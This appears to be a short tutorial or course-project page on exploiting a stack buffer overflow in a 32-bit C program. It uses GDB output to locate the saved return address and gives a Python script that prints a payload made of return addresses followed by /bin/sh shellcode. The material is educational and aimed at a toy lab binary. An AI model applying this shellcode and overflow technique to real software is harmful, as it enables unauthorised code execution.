---
layout: page
title: Memory Exploitation
subtitle: Buffer overflow in C
category: sec
---

This project examines one of the memory vulnerabilities - buffer overflow  in *C* and presents ways in which it can be exploited. Its main idea is to overwrite the Return Instruction Pointer ($**rip**) so that the program executes our shellcode instead of the originally intended instruction. The files for this project can be found [here]().

### Background

### Determining the address of RIP

The address of the $**rip** can be found by running `info frame` in [GDB](), while the offset of $**rip** from the beginning of the buffer can be determined by running the command `x/32x`. The `x/Px &buffer` command allows one to view `P` chunks of memory starting at `buffer`.

Here's a sample output after running `info frame`. 

```
GDB Output:
(gdb) info frame
 Stack level 0, frame at 0xbffffe00:
  eip = 0x8048412 in deja_vu (dejavu.c:7); saved eip 0x804842a
  called by frame at 0xbffffe10
  source language c.
  Arglist at 0xbffffdf8, args:
  Locals at 0xbffffdf8, Previous frame's sp is 0xbffffe00
  Saved registers:
   ebp at 0xbffffdf8, eip at 0xbffffdfc
```

Note that the `saved eip` is the value of $**rip** and after taking into account its offset from the beginning of the buffer we're trying to overflow, we find that the address of the register in memory is `0xbffffdfc`, as follows:

```
(gdb) x/32x &door
0xbffffde8:     0xbffffeac      0xb7e5f225      0xb7fed270      0x00000000
0xbffffdf8:     0xbffffe08      0x0804842a      0x08048440      0x00000000
0xbffffe08:     0x00000000      0xb7e454d3      0x00000001      0xbffffea4
0xbffffe18:     0xbffffeac      0xb7fdc858      0x00000000      0xbffffe1c
0xbffffe28:     0xbffffeac      0x00000000      0x0804821c      0xb7fd2000
0xbffffe38:     0x00000000      0x00000000      0x00000000      0xf09febf0
0xbffffe48:     0xc7caefe0      0x00000000      0x00000000      0x00000000
0xbffffe58:     0x00000001      0x08048320      0x00000000      0xb7ff26a0
```

We then proceed and run a python script that overwrites the buffer with that address (although it really doesn't matter what we fill the buffer with), followed by the address of where the shellcode is then being injected.

The script looks something like so: 

```python
#!/usr/bin/env python

shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0
b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd
c\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

print(5 * "\xfc\xfd\xff\xbf" + "\x00\xfe\xff\xbf" + shellcode)
```